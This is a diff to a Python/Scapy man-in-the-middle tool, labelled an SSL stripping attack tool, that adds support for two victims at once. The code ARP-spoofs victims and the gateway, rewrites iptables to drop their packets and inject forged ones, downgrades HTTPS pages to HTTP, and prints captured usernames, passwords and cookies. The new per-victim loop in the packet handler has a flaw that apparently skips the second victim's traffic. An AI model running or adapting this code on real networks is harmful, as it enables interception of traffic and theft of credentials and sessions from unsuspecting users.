@@ -4,9 +4,9 @@ from scapy.layers.l2 import ARP, Ether
 import os, sys, time, threading, re, argparse
 
 # network config
-IFACE = conf.iface                          # Default interface
-GATEWAY = conf.route.route('0.0.0.0')[2]    # Default gateway
-TARGET_SERVER = None                        # Can be set from command line
+IFACE = conf.iface  # Default interface
+GATEWAY = conf.route.route('0.0.0.0')[2]  # Default gateway
+TARGET_SERVER = None  # Can be set from command line
 
 # global session for cookies
 session = None
@@ -15,10 +15,12 @@ session = None
 def parse_arguments():
     """Parse command line arguments and return parsed args"""
     parser = argparse.ArgumentParser(description='SSL Stripping Attack Tool')
+    victim_group = parser.add_mutually_exclusive_group(required=True)
 
-    parser.add_argument('-i', '--interface', type=str,                help='Network interface to use')
-    parser.add_argument('-v', '--victim',    type=str, required=True, help='IP address of target victim')
-    parser.add_argument('-s', '--server',    type=str,                help='IP address of target server')
+    parser.add_argument('-i', '--interface', type=str, help='Network interface to use')
+    victim_group.add_argument('-t', '--target', type=str, help='IP address of single target victim')
+    victim_group.add_argument('-v', '--victim', nargs=2, type=str, help='IP addresses of two target victims')
+    parser.add_argument('-s', '--server', type=str, help='IP address of target server')
 
     return parser.parse_args()
 
@@ -34,12 +36,14 @@ def setup_system():
     os.system("iptables -A OUTPUT -p tcp --tcp-flags RST RST -j DROP")
 
     # block victim's packets after handshake so we can inject ours
-    os.system(f"iptables -I FORWARD -s {VICTIM} -p tcp --dport 80 -m state --state ESTABLISHED -j DROP")
-    os.system(f"iptables -I FORWARD -s {VICTIM} -p tcp --dport 443 -m state --state ESTABLISHED -j DROP")
+    for victim in VICTIM:
+        os.system(f"iptables -I FORWARD -s {victim} -p tcp --dport 80 -m state --state ESTABLISHED -j DROP")
+        os.system(f"iptables -I FORWARD -s {victim} -p tcp --dport 443 -m state --state ESTABLISHED -j DROP")
 
     # allow handshake to complete
-    os.system(f"iptables -I FORWARD -s {VICTIM} -p tcp --dport 80 -m state --state NEW -j ACCEPT")
-    os.system(f"iptables -I FORWARD -s {VICTIM} -p tcp --dport 443 -m state --state NEW -j ACCEPT")
+    for victim in VICTIM:
+        os.system(f"iptables -I FORWARD -s {victim} -p tcp --dport 80 -m state --state NEW -j ACCEPT")
+        os.system(f"iptables -I FORWARD -s {victim} -p tcp --dport 443 -m state --state NEW -j ACCEPT")
 
     print("""
 $$\       $$$$$$$$\ $$$$$$$$\       $$$$$$$$\ $$\   $$\ $$$$$$$$\        $$$$$$\   $$$$$$\  $$\      $$\ $$$$$$$$\  $$$$$$\  
@@ -50,9 +54,9 @@ $$ |      $$  __|      $$ |            $$ |   $$  __$$ |$$  __|         $$ |\_$$
 $$ |      $$ |         $$ |            $$ |   $$ |  $$ |$$ |            $$ |  $$ |$$ |  $$ |$$ |\$  /$$ |$$ |      $$\   $$ |
 $$$$$$$$\ $$$$$$$$\    $$ |            $$ |   $$ |  $$ |$$$$$$$$\       \$$$$$$  |$$ |  $$ |$$ | \_/ $$ |$$$$$$$$\ \$$$$$$  |
 \________|\________|   \__|            \__|   \__|  \__|\________|       \______/ \__|  \__|\__|     \__|\________| \______/ 
-                                                                                                                             
-                                                                                                                             
-                                                                                                                             
+
+
+
 $$$$$$$\  $$$$$$$$\  $$$$$$\  $$$$$$\ $$\   $$\                                                                              
 $$  __$$\ $$  _____|$$  __$$\ \_$$  _|$$$\  $$ |                                                                             
 $$ |  $$ |$$ |      $$ /  \__|  $$ |  $$$$\ $$ |                                                                             
@@ -61,9 +65,9 @@ $$  __$$\ $$  __|   $$ |\_$$ |  $$ |  $$ \$$$$ |
 $$ |  $$ |$$ |      $$ |  $$ |  $$ |  $$ |\$$$ |                                                                             
 $$$$$$$  |$$$$$$$$\ \$$$$$$  |$$$$$$\ $$ | \$$ |                                                                             
 \_______/ \________| \______/ \______|\__|  \__|                                                                             
-                                                                                                                             
-                                                                                                                             
-                                                                                                                             
+
+
+
 """)
     return True
 
@@ -74,20 +78,29 @@ def cleanup_system():
     os.system("iptables -F")
     os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
 
-    # fix arp
-    v_mac = get_mac(VICTIM)
+    # fix arp - get MACs for all victims
+    victim_macs = []
+    for victim in VICTIM:
+        mac = get_mac(victim)
+        victim_macs.append((victim, mac))
+
     g_mac = get_mac(GATEWAY)
 
-    if v_mac and g_mac:
-        send(ARP(op=2, pdst=VICTIM, hwdst=v_mac, psrc=GATEWAY, hwsrc=g_mac), count=5, verbose=0)
-        send(ARP(op=2, pdst=GATEWAY, hwdst=g_mac, psrc=VICTIM, hwsrc=v_mac), count=5, verbose=0)
+    # Restore ARP for each victim
+    if g_mac:
+        for victim_ip, victim_mac in victim_macs:
+            if victim_mac:
+                send(ARP(op=2, pdst=victim_ip, hwdst=victim_mac, psrc=GATEWAY, hwsrc=g_mac), count=5, verbose=0)
+                send(ARP(op=2, pdst=GATEWAY, hwdst=g_mac, psrc=victim_ip, hwsrc=victim_mac), count=5, verbose=0)
 
-        # restore server ARP
-        if TARGET_SERVER:
-            s_mac = get_mac(TARGET_SERVER)
-            if s_mac:
-                send(ARP(op=2, pdst=VICTIM, hwdst=v_mac, psrc=TARGET_SERVER, hwsrc=s_mac), count=5, verbose=0)
-                send(ARP(op=2, pdst=TARGET_SERVER, hwdst=s_mac, psrc=VICTIM, hwsrc=v_mac), count=5, verbose=0)
+                # restore server ARP if specified
+                if TARGET_SERVER:
+                    s_mac = get_mac(TARGET_SERVER)
+                    if s_mac:
+                        send(ARP(op=2, pdst=victim_ip, hwdst=victim_mac, psrc=TARGET_SERVER, hwsrc=s_mac), count=5,
+                             verbose=0)
+                        send(ARP(op=2, pdst=TARGET_SERVER, hwdst=s_mac, psrc=victim_ip, hwsrc=victim_mac), count=5,
+                             verbose=0)
 
         print("Network restored to original state")
 
@@ -95,7 +108,7 @@ def cleanup_system():
 def get_mac(ip):
     """get mac from ip"""
     try:
-        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=2, verbose=0, iface=IFACE)
+        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip), timeout=2, verbose=0, iface=IFACE)
         if ans:
             return ans[0][1].src
     except:
@@ -207,7 +220,7 @@ def http_send(pkt, content, interface):
 
     # close connection
     fin = IP(src=pkt[IP].dst, dst=pkt[IP].src) / \
-          TCP(sport=pkt[TCP].dport, dport=pkt[TCP].sport, flags="FA", seq=seq+len(resp), ack=ack)
+          TCP(sport=pkt[TCP].dport, dport=pkt[TCP].sport, flags="FA", seq=seq + len(resp), ack=ack)
     send(fin, verbose=0, iface=interface)
 
     return True
@@ -283,103 +296,104 @@ def extract_credentials(body, method):
 
 def handle_packet(pkt):
     """process intercepted packets"""
-    if not pkt.haslayer(Raw):
-        return
-
-    # only victim traffic
-    if pkt[IP].src != VICTIM or pkt[TCP].dport not in [80, 443]:
-        return
-
-    try:
-        data = pkt[Raw].load.decode('utf-8', errors='ignore')
-
-        # Quick check: if this packet contains form data, try to extract credentials
-        # This catches cases where POST body is in a separate packet
-        if 'username=' in data.lower() or 'password=' in data.lower():
-            import urllib.parse
-            try:
-                # Try to parse as form data
-                fields = {}
-                for pair in data.split('&'):
-                    if '=' in pair:
-                        key, value = pair.split('=', 1)
-                        key = urllib.parse.unquote_plus(key) #
-                        value = urllib.parse.unquote_plus(value) #
-                        fields[key.lower()] = value
-
-                if 'username' in fields or 'password' in fields:
-                    print("\n" + "="*60)
-                    print("CREDENTIALS SUCCESSFULLY CAPTURED!!!")
-                    print(f"    Source: {pkt[IP].src}")
-                    print(f"    Destination: {pkt[IP].dst}:{pkt[TCP].dport}")
-                    if 'username' in fields:
-                        print(f"    Username: {fields['username']}")
-                    if 'password' in fields:
-                        print(f"    Password: {fields['password']}")
-                    print("="*60 + "\n")
-            except:
-                pass
-
-        # check if http request
-        if "GET " not in data and "POST " not in data:
+    for VICTIM1 in VICTIM:
+        if not pkt.haslayer(Raw):
             return
 
-        # parse it
-        method, path, headers, body = parse_http(data)
-        if not headers:
+        # only victim traffic
+        if pkt[IP].src != VICTIM1 or pkt[TCP].dport not in [80, 443]:
             return
-
-        host = headers.get('Host')
-        if not host:
-            return
-
-        # Extract and display credentials if POST request
-        if method == "POST":
-            print(f"[*] POST request detected to {host}{path}")
-            print(f"[*] Body length: {len(body)} bytes")
-            if body:
-                print(f"[*] Body preview: {body[:200]}")
-
-            username, password = extract_credentials(body, method)
-            if username or password:
-                print("\n" + "="*60)
-                print("!!! CREDENTIALS CAPTURED !!!")
-                print(f"    Host: {host}")
-                print(f"    Path: {path}")
-                if username:
-                    print(f"    Username: {username}")
-                if password:
-                    print(f"    Password: {password}")
-                print("="*60 + "\n")
-            else:
-                print(f" POST detected but no credentials found in body")
-
-        # no compression
-        if 'Accept-Encoding' in headers:
-            del headers['Accept-Encoding']
 
         try:
-            # fetch from https
-            url = f"https://{host}{path}"
-            print(f" {method} {url}")
+            data = pkt[Raw].load.decode('utf-8', errors='ignore')
 
-            # Forward POST data or do GET request
-            status, resp_headers, resp_body = https_fetch(url, headers, method=method, body=body)
+            # Quick check: if this packet contains form data, try to extract credentials
+            # This catches cases where POST body is in a separate packet
+            if 'username=' in data.lower() or 'password=' in data.lower():
+                import urllib.parse
+                try:
+                    # Try to parse as form data
+                    fields = {}
+                    for pair in data.split('&'):
+                        if '=' in pair:
+                            key, value = pair.split('=', 1)
+                            key = urllib.parse.unquote_plus(key)
+                            value = urllib.parse.unquote_plus(value)
+                            fields[key.lower()] = value
 
-            if resp_body:
-                # check for cookies
-                if resp_headers and 'Set-Cookie' in resp_headers:
-                    print(f"[+] Grabbed cookies from {host}")
+                    if 'username' in fields or 'password' in fields:
+                        print("\n" + "=" * 60)
+                        print("CREDENTIALS SUCCESSFULLY CAPTURED!!!")
+                        print(f"    Source: {pkt[IP].src}")
+                        print(f"    Destination: {pkt[IP].dst}:{pkt[TCP].dport}")
+                        if 'username' in fields:
+                            print(f"    Username: {fields['username']}")
+                        if 'password' in fields:
+                            print(f"    Password: {fields['password']}")
+                        print("=" * 60 + "\n")
+                except:
+                    pass
 
-                # inject fake response
-                http_send(pkt, resp_body, IFACE)
-                print(f"[+] Stripped {host}")
+            # check if http request
+            if "GET " not in data and "POST " not in data:
+                return
 
-        except Exception as e:
-            print(f"[!] Error: {e}")
+            # parse it
+            method, path, headers, body = parse_http(data)
+            if not headers:
+                return
 
-    except:
-        pass
+            host = headers.get('Host')
+            if not host:
+                return
+
+            # Extract and display credentials if POST request
+            if method == "POST":
+                print(f"[*] POST request detected to {host}{path}")
+                print(f"[*] Body length: {len(body)} bytes")
+                if body:
+                    print(f"[*] Body preview: {body[:200]}")
+
+                username, password = extract_credentials(body, method)
+                if username or password:
+                    print("\n" + "=" * 60)
+                    print("!!! CREDENTIALS CAPTURED !!!")
+                    print(f"    Host: {host}")
+                    print(f"    Path: {path}")
+                    if username:
+                        print(f"    Username: {username}")
+                    if password:
+                        print(f"    Password: {password}")
+                    print("=" * 60 + "\n")
+                else:
+                    print(f" POST detected but no credentials found in body")
+
+            # no compression
+            if 'Accept-Encoding' in headers:
+                del headers['Accept-Encoding']
+
+            try:
+                # fetch from https
+                url = f"https://{host}{path}"
+                print(f" {method} {url}")
+
+                # Forward POST data or do GET request
+                status, resp_headers, resp_body = https_fetch(url, headers, method=method, body=body)
+
+                if resp_body:
+                    # check for cookies
+                    if resp_headers and 'Set-Cookie' in resp_headers:
+                        print(f"[+] Grabbed cookies from {host}")
+
+                    # inject fake response
+                    http_send(pkt, resp_body, IFACE)
+                    print(f"[+] Stripped {host}")
+
+            except Exception as e:
+                print(f"[!] Error: {e}")
+
+        except:
+            pass
 
 
 def main():
@@ -392,7 +406,11 @@ def main():
     if args.interface:
         IFACE = args.interface
 
-    VICTIM = args.victim  # Required argument
+    # Handle single target or dual victims
+    if args.target:
+        VICTIM = [args.target]  # Single victim mode
+    else:
+        VICTIM = args.victim  # Dual victim mode
 
     if args.server:
         TARGET_SERVER = args.server
@@ -401,7 +419,11 @@ def main():
     print(" SSL Stripping Attack Demo")
     print("=" * 50)
     print(f"Interface: {IFACE}")
-    print(f"Victim: {VICTIM}")
+    if len(VICTIM) == 1:
+        print(f"Target: {VICTIM[0]}")
+    else:
+        print(f"Victim1: {VICTIM[0]}")
+        print(f"Victim2: {VICTIM[1]}")
     print(f"Gateway: {GATEWAY}")
     if TARGET_SERVER:
         print(f"Target Server: {TARGET_SERVER}")
@@ -411,23 +433,36 @@ def main():
     if not setup_system():
         sys.exit(1)
 
-    # start arp spoofing
-    stop = threading.Event() #
-    t = threading.Thread(target=arp_spoof, args=(VICTIM, GATEWAY, IFACE, stop, TARGET_SERVER))
-    t.daemon = True #
-    t.start()
+    # start arp spoofing threads for each victim
+    threads = []
+    stop_events = []
+
+    for victim in VICTIM:
+        stop_event = threading.Event()
+        thread = threading.Thread(target=arp_spoof, args=(victim, GATEWAY, IFACE, stop_event, TARGET_SERVER))
+        thread.daemon = True
+        thread.start()
+        threads.append(thread)
+        stop_events.append(stop_event)
 
     time.sleep(3)
 
     print("\n[*] Sniffing traffic...")
 
+    # Build filter for all victims
+    victim_filter = " or ".join([f"src host {victim}" for victim in VICTIM])
+    filter_string = f"tcp and ({victim_filter})"
+
     try:
-        sniff(iface=IFACE, filter=f"tcp and src host {VICTIM}", prn=handle_packet, store=0)
+        sniff(iface=IFACE, filter=filter_string, prn=handle_packet, store=0)
     except KeyboardInterrupt:
         print("\n Stopping...")
     finally:
-        stop.set()
-        t.join(timeout=5)
+        # Stop all threads
+        for stop_event in stop_events:
+            stop_event.set()
+        for thread in threads:
+            thread.join(timeout=5)
         cleanup_system()
         print("""
             $$$$$$\       $$\   $$\  $$$$$$\  $$\    $$\ $$$$$$$$\        $$$$$$\  $$$$$$$\   $$$$$$\  $$\   $$\ $$$$$$$$\ $$\   $$\ 
